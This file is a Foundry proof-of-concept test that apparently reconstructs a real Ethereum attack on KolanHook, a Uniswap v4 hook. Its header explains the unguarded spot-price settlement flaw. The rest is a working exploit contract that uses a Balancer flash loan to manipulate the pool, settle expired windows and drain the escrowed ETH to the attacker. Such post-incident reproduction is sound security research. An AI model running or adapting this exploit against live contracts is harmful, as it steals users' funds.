// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 1.279453 ETH (attacker EOA net, after gas)
// Attacker        : 0x8df735014eab81905e76b87ef0c069bd8e0ae382
// Attack Contract : 0x4d6a41f2B80FE75FacF27F9D0b3DC8bd0EBC835f (Balancer flash-loan recipient / helper)
// Vulnerable      : 0x0136fecf49e0217bfd2d9551e8e7b05f174ba8ec (KolanHook, Uniswap v4 hook)
// Attack Tx       : https://etherscan.io/tx/0x7b131926e6f06491ae1aead3e419b208c8aa70ed7898e8c5a33d9f52e40915a9
// Chain           : Ethereum mainnet, 2026-10-15 (attack block 26197504, fork at parent 26197503)

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0x0136fecf49e0217bfd2d9551e8e7b05f174ba8ec#code
// KolanHook is verified on Etherscan (solc 0.8.26, non-proxy). All logic below is read from that source.

// @Analysis
// KolanHook escrows ETH-funded "buy windows" in the single ETH/KLN Uniswap v4 pool it owns. A window
// can be settled with accept(id). The settlement price comes from the SAME pool's instantaneous spot
// price, with no manipulation guard, and the three facts below were each confirmed against the verified
// source:
//
//  1. accept(id) is ungated once a window has expired. The only guard is
//       if (msg.sender != w.owner && block.timestamp < w.expiry) revert WindowStillOpen();
//     so after w.expiry ANY address may settle a window it does not own. No keeper/owner/role gate.
//
//  2. _closeWindow() trusts live spot price and runs an unbounded buy-back.
//       uint160 sqrtPrice = _sqrtPrice();                       // == POOL_MANAGER.getSlot0(_poolId()), live spot
//       backInPlace = keep ? sqrtPrice <= getSqrtPriceAtTick(lower) : sqrtPrice >= getSqrtPriceAtTick(upper);
//     accept() passes keep=true. When spot is pushed so the window is NOT "backInPlace", the escrowed
//     ETH is re-injected as single-sided liquidity around the manipulated price via _addEthAbove(), and
//       if (spendable > 0) _buyBack(spendable);
//     swaps that ETH with sqrtPriceLimitX96 = TickMath.MIN_SQRT_PRICE + 1, i.e. no price bound. No TWAP,
//     no observation, no slippage guard anywhere in the settlement path.
//
//  3. The whole sequence is permissionless. The attacker is a plain EOA driving its own helper contract,
//     which was itself deployed inside the attack transaction. Flash loan, spot move, accept() and the
//     reverse swap are all reachable with no privileged caller, signature or admin step.
//
// Reconstruction (own helper, real typed calls, NOT bytecode/calldata replay):
//   a. Flash-borrow 6.7 WETH from the Balancer Vault (fee 0) and unwrap to ETH.
//   b. Under one PoolManager.unlock, swap 6.7 ETH -> KLN (zeroForOne, exact-in) to move the pool spot.
//   c. accept(10) and accept(42) on the two real pre-existing expired windows. They settle at the moved
//      spot; window 42 is no longer "backInPlace" so its escrowed ETH is mispositioned into the pool.
//   d. Under a second unlock, reverse-swap the whole KLN balance back to ETH through that freshly placed
//      ETH liquidity, taking out 7.979914429958618589 ETH.
//   e. Re-wrap 6.7 WETH and repay the Balancer loan in full, so the loan nets to zero.
//
// The two windows and their escrowed ETH are legitimate pre-existing fork state:
//   window 10 : owner 0x4BBA7DcE..., expiry 1791494951, eth 2.0 + premium 0.05
//   window 42 : owner 0x43B6bf2E..., expiry 1791670463, eth 0.2 + premium 0.059861111
// Both expired long before the fork timestamp (1792062359). KolanHook held 2.309861 ETH total and was
// fully drained.
//
// Profit accounting: on-chain the reverse swap took out 7.979914429958618589 ETH, leaving a
// 7.979914.. - 6.7 = 1.279914429958618589 ETH surplus after repayment, and the attacker EOA's real net
// balance delta was 1.279453 ETH (that surplus minus ~0.00046 ETH of gas). This PoC forks at the parent
// block exactly as the brief requires, so the pool is one block behind the attacker's position inside
// block 26197504; the reconstructed surplus is therefore ~1.2805 ETH rather than the exact on-chain
// 1.279914.. (a sub-0.001 ETH intra-block drift). forge does not debit gas from balances. The test
// asserts the headline 1.279453 ETH net within a 0.0015 ETH band and that the surplus is at least that.

address constant ATTACKER = 0x8df735014EaB81905E76B87Ef0c069BD8e0Ae382;
address constant TRACE_HELPER = 0x4d6a41f2B80FE75FacF27F9D0b3DC8bd0EBC835f;
address constant KOLAN_HOOK = 0x0136feCf49E0217BFd2D9551E8e7b05f174Ba8eC;
address constant POOL_MANAGER = 0x000000000004444c5dc75cB358380D2e3dE08A90;
address constant KLN = 0x2CADc4F2660Bb77a118b0e74fC9E48E935b3a1bF;
address constant WETH_ADDR = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

// Uniswap v4 rejects price limits equal to TickMath's min/max bounds, so use bound +/- 1.
uint160 constant V4_MIN_USABLE_SQRT_PRICE = 4_295_128_740;
uint160 constant V4_MAX_USABLE_SQRT_PRICE = 1_461_446_703_485_210_103_287_273_052_203_988_822_378_723_970_341;

uint256 constant WINDOW_A = 10;
uint256 constant WINDOW_B = 42;
uint256 constant FLASH_AMOUNT = 6.7 ether;

struct PoolKey {
    address currency0;
    address currency1;
    uint24 fee;
    int24 tickSpacing;
    address hooks;
}

struct SwapParams {
    bool zeroForOne;
    int256 amountSpecified;
    uint160 sqrtPriceLimitX96;
}

interface IUniswapV4PoolManager {
    function unlock(
        bytes calldata data
    ) external returns (bytes memory);
    function swap(
        PoolKey memory key,
        SwapParams memory params,
        bytes calldata hookData
    ) external returns (int256);
    function settle() external payable returns (uint256);
    function sync(
        address currency
    ) external;
    function take(address currency, address to, uint256 amount) external;
}

interface IKolanBalancerVault {
    function flashLoan(
        address recipient,
        address[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IKolanHook {
    function accept(
        uint256 id
    ) external;
}

interface IWETH9 {
    function deposit() external payable;
    function withdraw(
        uint256 wad
    ) external;
    function transfer(address dst, uint256 wad) external returns (bool);
    function balanceOf(
        address
    ) external view returns (uint256);
}

contract ContractTest is BaseTestWithBalanceLog {
    // Public archive endpoint (same style as the other recent mainnet PoCs in this repo).
    string internal constant MAINNET_ARCHIVE = "https://eth.drpc.org";
    uint256 internal constant ATTACK_BLOCK = 26_197_504;

    function setUp() public {
        vm.createSelectFork(MAINNET_ARCHIVE, ATTACK_BLOCK - 1);

        attacker = ATTACKER;

        vm.label(ATTACKER, "Attacker / Profit Receiver");
        vm.label(TRACE_HELPER, "Trace Attack Contract");
        vm.label(KOLAN_HOOK, "KolanHook");
        vm.label(POOL_MANAGER, "Uniswap V4 PoolManager");
        vm.label(BALANCER_VAULT, "Balancer Vault");
        vm.label(KLN, "KLN");
        vm.label(WETH_ADDR, "WETH");
    }

    function testExploit() public balanceLog {
        // A fresh helper; the trace helper was likewise created inside the attack transaction.
        KolanHookExploit exploit = new KolanHookExploit();
        exploit.attack();

        uint256 profit = ATTACKER.balance;
        // On-chain the attacker EOA netted 1.279453 ETH (surplus 1.279914.. minus ~0.00046 ETH gas).
        // The parent-block fork reconstructs ~1.2805 ETH of surplus (see the accounting note in the header).
        assertGe(profit, 1.279453 ether, "net ETH gain below on-chain figure");
        assertApproxEqAbs(profit, 1.279453 ether, 0.0015 ether, "net ETH gain != 1.279453 ETH");
    }
}

contract KolanHookExploit {
    IUniswapV4PoolManager private constant MANAGER = IUniswapV4PoolManager(POOL_MANAGER);
    IKolanBalancerVault private constant VAULT = IKolanBalancerVault(BALANCER_VAULT);
    IKolanHook private constant HOOK = IKolanHook(KOLAN_HOOK);
    IWETH9 private constant WETH9 = IWETH9(WETH_ADDR);

    PoolKey private poolKey =
        PoolKey({currency0: address(0), currency1: KLN, fee: 0, tickSpacing: 10, hooks: KOLAN_HOOK});

    function attack() external {
        address[] memory tokens = new address[](1);
        tokens[0] = WETH_ADDR;
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = FLASH_AMOUNT;
        VAULT.flashLoan(address(this), tokens, amounts, "");
    }

    function receiveFlashLoan(
        address[] memory, /*tokens*/
        uint256[] memory, /*amounts*/
        uint256[] memory, /*feeAmounts*/
        bytes memory /*userData*/
    ) external {
        require(msg.sender == BALANCER_VAULT, "only vault");

        // Unwrap the borrowed WETH so it can be settled as native ETH into the v4 pool.
        WETH9.withdraw(FLASH_AMOUNT);

        // Phase 0: move the ETH/KLN spot price by buying KLN with the full 6.7 ETH.
        MANAGER.unlock(abi.encode(uint256(0)));

        // Settle the two expired windows at the manipulated spot. accept() is ungated post-expiry and
        // passes keep=true; window 42 is no longer "backInPlace" and its escrowed ETH is mispositioned.
        HOOK.accept(WINDOW_A);
        HOOK.accept(WINDOW_B);

        // Phase 1: reverse the whole KLN position back to ETH through the freshly placed ETH liquidity.
        MANAGER.unlock(abi.encode(uint256(1)));

        // Repay the flash loan in full (Balancer fee is 0), so the loan nets to zero.
        WETH9.deposit{value: FLASH_AMOUNT}();
        WETH9.transfer(BALANCER_VAULT, FLASH_AMOUNT);

        // Forward the ETH surplus to the attacker EOA.
        (bool ok,) = ATTACKER.call{value: address(this).balance}("");
        require(ok, "forward failed");
    }

    function unlockCallback(
        bytes calldata data
    ) external returns (bytes memory) {
        require(msg.sender == POOL_MANAGER, "only PoolManager");
        uint256 phase = abi.decode(data, (uint256));

        if (phase == 0) {
            // Exact-in 6.7 ETH -> KLN. Owe ETH (delta0 < 0), receive KLN (delta1 > 0).
            int256 packed = MANAGER.swap(
                poolKey,
                SwapParams({
                    zeroForOne: true,
                    amountSpecified: -int256(FLASH_AMOUNT),
                    sqrtPriceLimitX96: V4_MIN_USABLE_SQRT_PRICE
                }),
                ""
            );
            int128 delta0 = int128(packed >> 128);
            int128 delta1 = int128(packed);
            MANAGER.settle{value: uint256(uint128(-delta0))}();
            MANAGER.take(KLN, address(this), uint256(uint128(delta1)));
        } else {
            // Exact-in all KLN -> ETH. Owe KLN (delta1 < 0), receive ETH (delta0 > 0).
            uint256 klnBalance = IERC20(KLN).balanceOf(address(this));
            int256 packed = MANAGER.swap(
                poolKey,
                SwapParams({
                    zeroForOne: false,
                    amountSpecified: -int256(klnBalance),
                    sqrtPriceLimitX96: V4_MAX_USABLE_SQRT_PRICE
                }),
                ""
            );
            int128 delta0 = int128(packed >> 128);
            int128 delta1 = int128(packed);
            MANAGER.sync(KLN);
            IERC20(KLN).transfer(POOL_MANAGER, uint256(uint128(-delta1)));
            MANAGER.settle();
            MANAGER.take(address(0), address(this), uint256(uint128(delta0)));
        }
        return "";
    }

    receive() external payable {}
}
